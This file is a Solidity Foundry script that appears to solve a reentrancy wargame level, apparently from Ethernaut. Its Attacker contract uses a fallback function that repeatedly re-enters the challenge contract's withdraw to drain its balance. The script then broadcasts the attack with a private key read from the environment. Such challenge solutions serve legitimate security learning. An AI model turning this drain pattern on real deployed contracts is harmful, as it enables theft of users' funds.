// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Reentrance } from "../src/10_Reentrancy.sol";

contract Attacker {
  Reentrance challenge;

  constructor (address payable challengeInstanceAddress) public {
    challenge = Reentrance(challengeInstanceAddress);
  }

  function donate(address _to) public payable {
    challenge.donate{value: msg.value}(_to);
  }

  function withdraw(uint256 _amount) public payable {
    challenge.withdraw(_amount);
  }

  fallback() external payable {
    if(challenge.balanceOf(address(this)) > 0){
      challenge.withdraw(0.001 ether);
    }
  }

}

contract ReentrancyAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("Reentrancy"));

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.donate{value: 0.001 ether}(address(attacker));
    attacker.withdraw(0.001 ether);

    console.log("Instance balance: ", address(challengeInstanceAddress).balance);

    vm.stopBroadcast();
  }

}